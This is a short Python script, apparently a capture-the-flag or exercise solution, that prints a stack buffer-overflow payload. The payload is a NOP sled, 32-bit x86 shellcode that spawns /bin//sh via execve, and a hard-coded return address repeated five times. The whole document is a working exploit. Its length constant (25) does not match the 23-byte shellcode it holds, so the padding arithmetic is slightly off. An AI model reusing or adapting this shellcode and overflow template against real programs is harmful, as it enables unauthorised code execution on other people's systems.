#!/usr/bin/python3

PAYLOAD = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69" + \
		  "\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
PAYLOAD_LEN = 25

def main():
    print('\x90' * (64 - PAYLOAD_LEN) + PAYLOAD + '\x08\x04\x85\xeb'[::-1] * 5)

if __name__ == "__main__":
    main()
